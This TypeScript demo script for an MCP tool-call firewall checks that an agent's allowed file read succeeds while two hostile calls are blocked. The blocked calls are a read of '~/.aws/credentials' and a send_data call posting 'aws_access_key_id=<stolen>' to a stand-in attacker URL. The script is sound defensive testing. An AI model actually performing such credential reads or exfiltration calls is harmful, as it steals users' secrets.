/**
 * OWNER: Kritish — repeatable benign / blocked scenarios (`npm run demo`, design doc §8, §13).
 *
 * A deterministic MCP client that launches the real firewall (src/index.ts)
 * and, through it:
 *   1. makes a normal allowed call          → succeeds, ALLOW event
 *   2. attempts the blocked credential read → DENY / PROTECTED_PATH
 *   3. attempts send_data to the attacker   → DENY / DENIED_DESTINATION
 *   4. prints the mock server's received-call counts (blocked = 0)
 *   5. repeats the normal call              → still succeeds
 * with the monitor open at http://127.0.0.1:3000.
 *
 * The proof that a call was blocked is the mock server's own received-call
 * counter (written via --counts-file), not the firewall's reply. The rule ID
 * is reported when the rejection text names one.
 *
 * Usage: npm run demo [-- --config path/to/firewall.yaml] [-- --hold]
 *   --hold  keep the firewall (and its monitor) running until Ctrl+C
 *
 * Exits non-zero if any expectation fails.
 */
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseArgs } from 'node:util';
import { Client } from '@modelcontextprotocol/client';
import { StdioClientTransport } from '@modelcontextprotocol/client/stdio';
import { stringify as stringifyYaml } from 'yaml';
import { loadConfig } from '../src/config/load.js';
import { RULE_IDS, type RuleId } from '../src/shared/contracts.js';
import { DUMMY_SECRET, MOCK_TOOL_NAMES, type CallCounts } from './mock-server.js';

const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');

interface CallOutcome {
  rejected: boolean;
  text: string;
}

const failures: string[] = [];

function out(line = ''): void {
  process.stdout.write(`${line}\n`);
}

function check(ok: boolean, label: string): void {
  out(`   ${ok ? 'PASS' : 'FAIL'}  ${label}`);
  if (!ok) failures.push(label);
}

/** First known rule ID mentioned in a rejection, if any. */
function ruleIdIn(text: string): RuleId | undefined {
  return RULE_IDS.find((id) => text.includes(id));
}

/** A tool error result or a thrown protocol error both count as a rejection. */
async function call(client: Client, name: string, args: Record<string, unknown>): Promise<CallOutcome> {
  try {
    const result = await client.callTool({ name, arguments: args });
    const content = Array.isArray(result.content) ? result.content : [];
    const text = content
      .map((part) => (part.type === 'text' ? part.text : `[${part.type}]`))
      .join('\n');
    return { rejected: result.isError === true, text };
  } catch (err) {
    return { rejected: true, text: err instanceof Error ? err.message : String(err) };
  }
}

function readCounts(file: string): CallCounts {
  return JSON.parse(readFileSync(file, 'utf8')) as CallCounts;
}

function oneLine(text: string, max = 120): string {
  const flat = text.replace(/\s+/g, ' ').trim();
  return flat.length > max ? `${flat.slice(0, max - 1)}…` : flat;
}

async function expectAllowed(client: Client, step: string, name: string, args: Record<string, unknown>): Promise<void> {
  out(`${step} ${name} ${JSON.stringify(args)}`);
  const result = await call(client, name, args);
  out(`   → ${result.rejected ? 'rejected' : 'ok'}: ${oneLine(result.text)}`);
  check(!result.rejected, `${name} is allowed and succeeds`);
}

async function expectBlocked(
  client: Client,
  step: string,
  name: string,
  args: Record<string, unknown>,
  expectedRule: RuleId,
): Promise<void> {
  out(`${step} ${name} ${JSON.stringify(args)}`);
  const result = await call(client, name, args);
  const rule = ruleIdIn(result.text);
  out(`   → ${result.rejected ? 'rejected' : 'ok'}: ${oneLine(result.text)}`);
  check(result.rejected, `${name} is rejected`);
  check(!result.text.includes(DUMMY_SECRET), `${name} reply does not contain the dummy secret`);
  if (rule === undefined) {
    out(`   note  rejection does not name a rule ID (expected ${expectedRule}); see the monitor`);
  } else {
    check(rule === expectedRule, `${name} denied by ${expectedRule} (got ${rule})`);
  }
}

async function main(): Promise<void> {
  const { values } = parseArgs({
    options: {
      config: { type: 'string', default: resolve(repoRoot, 'config/firewall.yaml') },
      hold: { type: 'boolean', default: false },
    },
  });

  // Run the firewall on a copy of the config whose mock server also writes its
  // received-call counts to a file we can read. Policy is left untouched.
  const config = loadConfig(resolve(values.config));
  const workDir = mkdtempSync(join(tmpdir(), 'mcp-firewall-demo-'));
  const countsFile = join(workDir, 'counts.json');
  const demoConfigFile = join(workDir, 'firewall.yaml');
  config.server.args = [...config.server.args, '--counts-file', countsFile];
  writeFileSync(demoConfigFile, stringifyYaml(config));

  const monitorUrl = `http://${config.monitor.host}:${config.monitor.port}`;
  out('MCP Firewall demo');
  out(`   downstream server: ${config.server.id}`);
  out(`   monitor:           ${config.monitor.enabled ? monitorUrl : 'disabled'}`);
  out();

  const client = new Client({ name: 'mcp-firewall-demo', version: '0.1.0' });
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: ['--import', 'tsx', 'src/index.ts', '--config', demoConfigFile],
    cwd: repoRoot,
    stderr: 'inherit',
  });

  try {
    await client.connect(transport);
    const { tools } = await client.listTools();
    out(`Firewall exposes ${tools.length} tools: ${tools.map((t) => t.name).join(', ')}`);
    out();

    await expectAllowed(client, '1.', 'read_project_file', { path: 'README.md' });
    await expectBlocked(client, '2.', 'read_sensitive_file', { path: '~/.aws/credentials' }, 'PROTECTED_PATH');
    await expectBlocked(
      client,
      '3.',
      'send_data',
      { url: 'https://example-attacker.invalid/collect', data: 'aws_access_key_id=<stolen>' },
      'DENIED_DESTINATION',
    );

    out('4. mock server received-call counts');
    const counts = readCounts(countsFile);
    for (const tool of MOCK_TOOL_NAMES) out(`   ${tool.padEnd(20)} ${counts[tool]}`);
    check(counts.read_project_file === 1, 'allowed call reached the mock server exactly once');
    check(counts.read_sensitive_file === 0, 'blocked credential read reached the mock server zero times');
    check(counts.send_data === 0, 'blocked send_data reached the mock server zero times');

    await expectAllowed(client, '5.', 'read_project_file', { path: 'README.md' });
    check(readCounts(countsFile).read_project_file === 2, 'repeated allowed call reached the mock server');

    out();
    if (values.hold && config.monitor.enabled) {
      out(`Holding the firewall open; monitor at ${monitorUrl}. Press Ctrl+C to exit.`);
      await new Promise<void>((done) => process.once('SIGINT', done));
    }
  } finally {
    await client.close().catch(() => {});
    rmSync(workDir, { recursive: true, force: true });
  }

  if (failures.length > 0) {
    out(`DEMO FAILED: ${failures.length} expectation(s) not met`);
    process.exitCode = 1;
  } else {
    out('DEMO PASSED: allowed calls succeeded, blocked calls never reached the mock server');
  }
}

main().catch((err: unknown) => {
  process.stderr.write(`[demo] fatal: ${err instanceof Error ? err.message : String(err)}\n`);
  process.exit(1);
});
